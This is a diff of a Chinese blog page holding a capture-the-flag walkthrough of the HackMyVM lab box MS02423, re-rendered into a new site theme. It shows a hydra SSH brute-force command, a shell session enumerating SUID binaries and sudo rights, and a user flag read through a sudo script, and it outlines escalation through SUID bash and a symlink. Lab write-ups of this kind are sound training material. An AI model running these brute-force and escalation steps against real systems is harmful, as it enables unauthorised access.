+└─# hydra -L users.txt -P rockyou.txt ssh://192.168.56.126 -V -I -u -f</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211135607959.png" alt="image-20260211135607959" loading="lazy" decoding="async"></figure></p>
+<figure class="code-block"><figcaption><span>bash</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-bash">Linux MS02423 4.19.0-27-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
 
-<p>直接爆破ssh即可 思路很固定</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/yiyi]</span><br><span class="line">└─<span class="comment"># hydra -L users.txt -P rockyou.txt ssh://192.168.56.126 -V -I -u -f</span></span><br></pre></td></tr></table></figure>
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the
+individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.
 
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211135607959.png" alt="image-20260211135607959"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">Linux MS02423 4.19.0-27-amd64 <span class="comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Jan 14 01:02:20 2026 from 192.168.137.102</span><br><span class="line">-bash-5.0$ <span class="built_in">id</span></span><br><span class="line">uid=1000(2002) gid=1000(2002) 组=1000(2002)</span><br><span class="line">-bash-5.0$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">-bash-5.0$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/libexec/polkit-agent-helper-1</span><br><span class="line">-bash-5.0$ sudo -l</span><br><span class="line">匹配 %2<span class="variable">$s</span> 上 %1<span class="variable">$s</span> 的默认条目：</span><br><span class="line">    !env_reset, mail_badpass, !env_reset, always_set_home</span><br><span class="line"></span><br><span class="line">用户 2002 可以在 MS02423 上运行以下命令：</span><br><span class="line">    (ALL) NOPASSWD: /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh</span><br><span class="line">-bash-5.0$ <span class="built_in">cat</span> /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh</span><br><span class="line"><span class="built_in">cat</span>: /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh: 权限不够</span><br><span class="line">-bash-5.0$ <span class="built_in">id</span> /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh</span><br><span class="line"><span class="built_in">id</span>: “/usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh”：无此用户</span><br><span class="line">-bash-5.0$ <span class="built_in">ls</span> -al /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/</span><br><span class="line">总用量 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 1月  14 01:22 .</span><br><span class="line">drwxr-xr-x 75 root root 4096 1月  12 23:33 ..</span><br><span class="line">-rwx------  1 root root 3244 1月  14 01:22 gsjy.sh</span><br><span class="line">-bash-5.0$ sudo /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh</span><br><span class="line">==============================================</span><br><span class="line">          通用目标查询脚本                      </span><br><span class="line">==============================================</span><br><span class="line">[使用格式] /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh &lt;目标路径&gt;</span><br><span class="line">==============================================</span><br><span class="line">-bash-5.0$ sudo /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh /root/root.txt</span><br><span class="line">==============================================</span><br><span class="line">          脚本执行提示                          </span><br><span class="line">==============================================</span><br><span class="line"></span><br><span class="line">[禁止] 不能处理该目标！</span><br><span class="line">[建议] 试试处理其他目标路径。</span><br><span class="line"></span><br><span class="line">==============================================</span><br><span class="line">          脚本执行终止                          </span><br><span class="line">==============================================</span><br><span class="line">-bash-5.0$ sudo /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh /home/2002/user.txt</span><br><span class="line">==============================================</span><br><span class="line">          靶机通用目标查询脚本                  </span><br><span class="line">==============================================</span><br><span class="line"></span><br><span class="line">[任务] 准备处理目标：/home/2002/user.txt</span><br><span class="line"></span><br><span class="line">------------------- 目标内容 -------------------</span><br><span class="line">  flag:&#123;user-2b169d1b87972948a3ccc88dd28bde99&#125;</span><br><span class="line">---------------------------------------------------</span><br><span class="line"></span><br><span class="line">[成功] 已处理目标：/home/2002/user.txt</span><br><span class="line"></span><br><span class="line">==============================================</span><br><span class="line">          脚本执行完成                          </span><br><span class="line">==============================================</span><br><span class="line">-bash-5.0$ </span><br></pre></td></tr></table></figure>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Wed Jan 14 01:02:20 2026 from 192.168.137.102
+-bash-5.0$ <span class="hljs-built_in">id</span>
+uid=1000(2002) gid=1000(2002) 组=1000(2002)
+-bash-5.0$ <span class="hljs-built_in">ls</span>
+user.txt
+-bash-5.0$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/bash
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+-bash-5.0$ <span class="hljs-built_in">sudo</span> -l
+匹配 %2<span class="hljs-variable">$s</span> 上 %1<span class="hljs-variable">$s</span> 的默认条目：
+    !env_reset, mail_badpass, !env_reset, always_set_home
 
-<p>发现sudo有个脚本可以读文件 但是不能读root.txt</p>
+用户 2002 可以在 MS02423 上运行以下命令：
+    (ALL) NOPASSWD: /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh
+-bash-5.0$ <span class="hljs-built_in">cat</span> /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh
+<span class="hljs-built_in">cat</span>: /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh: 权限不够
+-bash-5.0$ <span class="hljs-built_in">id</span> /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh
+<span class="hljs-built_in">id</span>: “/usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh”：无此用户
+-bash-5.0$ <span class="hljs-built_in">ls</span> -al /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/
+总用量 12
+drwxr-xr-x  2 root root 4096 1月  14 01:22 .
+drwxr-xr-x 75 root root 4096 1月  12 23:33 ..
+-rwx------  1 root root 3244 1月  14 01:22 gsjy.sh
+-bash-5.0$ <span class="hljs-built_in">sudo</span> /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh
+==============================================
+          通用目标查询脚本                      
+==============================================
+[使用格式] /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh &lt;目标路径&gt;
+==============================================
+-bash-5.0$ <span class="hljs-built_in">sudo</span> /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh /root/root.txt
+==============================================
+          脚本执行提示                          
+==============================================
+
+[禁止] 不能处理该目标！
+[建议] 试试处理其他目标路径。
+
+==============================================
+          脚本执行终止                          
+==============================================
+-bash-5.0$ <span class="hljs-built_in">sudo</span> /usr/lib/modules/4.19.0-27-amd64/kernel/drivers/hidden_gsjy/gsjy.sh /home/2002/user.txt
+==============================================
+          靶机通用目标查询脚本                  
+==============================================
+
+[任务] 准备处理目标：/home/2002/user.txt
+
+------------------- 目标内容 -------------------
+  flag:{user-2b169d1b87972948a3ccc88dd28bde99}
+---------------------------------------------------
+
+[成功] 已处理目标：/home/2002/user.txt
+
+==============================================
+          脚本执行完成                          
+==============================================
+-bash-5.0$ </code></pre></figure><p>发现sudo有个脚本可以读文件 但是不能读root.txt</p>
 <p>明确思路 首先bash有suid权限，那么bash后通过软连接读flag即可</p>
-<p><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211140452860.png" alt="image-20260211140452860"></p>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io">yiyi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xyaxxya.github.io/posts/8cc5a836.html">https://xyaxxya.github.io/posts/8cc5a836.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xyaxxya.github.io" target="_blank">Yiyi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="https://www.dmoe.cc/random.php?2667" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/942cb43a.html" title="HMVM-Poppins"><img class="cover" src="https://www.dmoe.cc/random.php?8829" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HMVM-Poppins</div></div></a></div><div class="next-post pull-right"><a href="/posts/3d3db288.html" title="HMVM-Coolpg"><img class="cover" src="https://www.dmoe.cc/random.php?6586" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HMVM-Coolpg</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/3d3db288.html" title="HMVM-Coolpg"><img class="cover" src="https://www.dmoe.cc/random.php?6586" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-10</div><div class="title">HMVM-Coolpg</div></div></a></div><div><a href="/posts/942cb43a.html" title="HMVM-Poppins"><img class="cover" src="https://www.dmoe.cc/random.php?8829" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-12</div><div class="title">HMVM-Poppins</div></div></a></div><div><a href="/posts/54ae0e11.html" title="HTB-Cat"><img class="cover" src="https://www.dmoe.cc/random.php?7371" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-20</div><div class="title">HTB-Cat</div></div></a></div><div><a href="/posts/92e7967d.html" title="HTB-Administrator"><img class="cover" src="https://www.dmoe.cc/random.php?4645" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-22</div><div class="title">HTB-Administrator</div></div></a></div><div><a href="/posts/72ffed1e.html" title="HTB-Cypher"><img class="cover" src="https://www.dmoe.cc/random.php?7280" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-23</div><div class="title">HTB-Cypher</div></div></a></div><div><a href="/posts/4bdc74c4.html" title="HTB-Dog"><img class="cover" src="https://www.dmoe.cc/random.php?8208" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-24</div><div class="title">HTB-Dog</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yiyi</div><div class="author-info__description">春风得意马蹄疾，一日看尽长安花</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">69</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xyaxxya"><i class="fab fa-github"></i><span>关注捏</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xyaxxya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/3170234809@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://blog.csdn.net/xydsg" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=3170234809&amp;site=qq&amp;menu=yes" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="https://xyaxxya.github.io/2023/09/23/about-me/" target="_blank" title="wechat"><i class="fab fa-weixin"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">慢慢来，比较快</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/942cb43a.html" title="HMVM-Poppins"><img src="https://www.dmoe.cc/random.php?8829" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMVM-Poppins"/></a><div class="content"><a class="title" href="/posts/942cb43a.html" title="HMVM-Poppins">HMVM-Poppins</a><time datetime="2026-02-12T04:39:15.000Z" title="发表于 2026-02-12 12:39:15">2026-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8cc5a836.html" title="HMVM-MS02423"><img src="https://www.dmoe.cc/random.php?2667" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMVM-MS02423"/></a><div class="content"><a class="title" href="/posts/8cc5a836.html" title="HMVM-MS02423">HMVM-MS02423</a><time datetime="2026-02-11T04:57:11.000Z" title="发表于 2026-02-11 12:57:11">2026-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3d3db288.html" title="HMVM-Coolpg"><img src="https://www.dmoe.cc/random.php?6586" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HMVM-Coolpg"/></a><div class="content"><a class="title" href="/posts/3d3db288.html" title="HMVM-Coolpg">HMVM-Coolpg</a><time datetime="2026-02-10T03:48:19.000Z" title="发表于 2026-02-10 11:48:19">2026-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/caa2ab8d.html" title="第十八届软件系统安全赛半决赛取证DC"><img src="https://www.dmoe.cc/random.php?4515" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第十八届软件系统安全赛半决赛取证DC"/></a><div class="content"><a class="title" href="/posts/caa2ab8d.html" title="第十八届软件系统安全赛半决赛取证DC">第十八届软件系统安全赛半决赛取证DC</a><time datetime="2026-02-08T05:11:41.000Z" title="发表于 2026-02-08 13:11:41">2026-02-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1f59513d.html" title="2025年度总结"><img src="https://www.dmoe.cc/random.php?2980" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2025年度总结"/></a><div class="content"><a class="title" href="/posts/1f59513d.html" title="2025年度总结">2025年度总结</a><time datetime="2026-01-12T13:55:08.000Z" title="发表于 2026-01-12 21:55:08">2026-01-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By yiyi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎常来喵~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
-  const initValine = () => {
-    const valine = new Valine(Object.assign({
-      el: '#vcomment',
-      appId: 'pYgEIy3e8aneCT2SHN7sYl1L-gzGzoHsz',
-      appKey: 'V8vEx9nsiDEMy45ekCcPUaiN',
-      avatar: 'monsterid',
-      serverURLs: 'https://pygeiy3e.lc-cn-n1-shared.com',
-      emojiMaps: "",
-      path: window.location.pathname,
-      visitor: true
-    }, null))
-  }
-
-  const loadValine = async () => {
-    if (typeof Valine === 'function') initValine()
-    else {
-      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
-      initValine()
-    }
-  }
-
-  if ('Valine' === 'Valine' || !false) {
-    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
-    else setTimeout(loadValine, 0)
-  } else {
-    window.loadOtherComment = loadValine
-  }
-})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
-POWERMODE.shake = true;
-POWERMODE.mobile = true;
-document.body.addEventListener('input', POWERMODE);
-</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="❤️,🩷,🧡,💛,💚,💙,🩵,💜,🤎,🖤,🩶,🤍" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
+<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20260211140452860.png" alt="image-20260211140452860" loading="lazy" decoding="async"></figure></p>
+</article>
+        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><p>本文没有分节</p></div></nav></aside>
+      </div>
+      <div class="post-tools section-shell">
+        <button type="button" data-copy-link><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path><line x1="8" x2="16" y1="12" y2="12"></line></svg><span>复制链接</span></button>
+        <a href="/archives/"><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M8 5h13"></path><path d="M13 12h8"></path><path d="M13 19h8"></path><path d="M3 10a2 2 0 0 0 2 2h3"></path><path d="M3 5v12a2 2 0 0 0 2 2h3"></path></svg><span>查看归档</span></a>
+      </div>
+      <nav class="post-pagination section-shell" aria-label="文章翻页">
+        <a href="/posts/3d3db288.html"><span><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m12 19-7-7 7-7"></path><path d="M19 12H5"></path></svg>上一篇</span><strong>HMVM-Coolpg</strong></a>
+        <a class="post-next" href="/posts/942cb43a.html"><span>下一篇<svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></svg></span><strong>HMVM-Poppins</strong></a>
+      </nav>
+      <section class="related-posts section-shell"><header><span>Related</span><h2>同专题继续阅读</h2></header><div>
+    <a href="/posts/942cb43a.html"><span>2026/02/12</span><strong>HMVM-Poppins</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a>
+    <a href="/posts/3d3db288.html"><span>2026/02/10</span><strong>HMVM-Coolpg</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a>
+    <a href="/posts/c0aca0e.html"><span>2025/04/25</span><strong>春秋云镜-Privilege</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></div></section>
+    </main>
+    
+    
+    <footer class="site-footer">
+      <div class="footer-lead">
+        <a class="footer-brand" href="/">Yiyi</a>
+        <p>春风得意马蹄疾，一日看尽长安花<br><span>慢慢来，比较快</span></p>
+      </div>
+      <div class="footer-links">
+        <nav aria-label="页脚导航"><a class="" href="/#articles">文章</a><a class="" href="/categories/">专题</a><a class="" href="/tags/">标签</a><a class="" href="/archives/">归档</a><a class="" href="/about/">关于</a></nav>
+        <div class="footer-social">
+    <a href="https://github.com/xyaxxya" target="_blank" rel="noopener noreferrer"><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg><span>GitHub</span></a>
+    <a href="https://blog.csdn.net/xydsg" target="_blank" rel="noopener noreferrer"><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg><span>CSDN</span></a>
+    <a href="mailto:3170234809@qq.com"><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg><span>Email</span></a></div>
+      </div>
+      <div class="footer-bottom">
+        <span>© 2026 yiyi</span>
+        <span>春风正好，步履不停</span>
+      </div>
+    </footer>
+    
+    <div class="mobile-menu" data-mobile-menu aria-hidden="true">
+      <button class="mobile-menu-close" type="button" data-menu-close aria-label="关闭菜单"><svg class="icon" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
+      <nav aria-label="移动导航"><a class="mobile-menu-link" href="/#articles">文章</a><a class="mobile-menu-link" href="/categories/">专题</a><a class="mobile-menu-link" href="/tags/">标签</a><a class="mobile-menu-link" href="/archives/">归档</a><a class="mobile-menu-link" href="/about/">关于</a></nav>
+      <div class="mobile-menu-social">
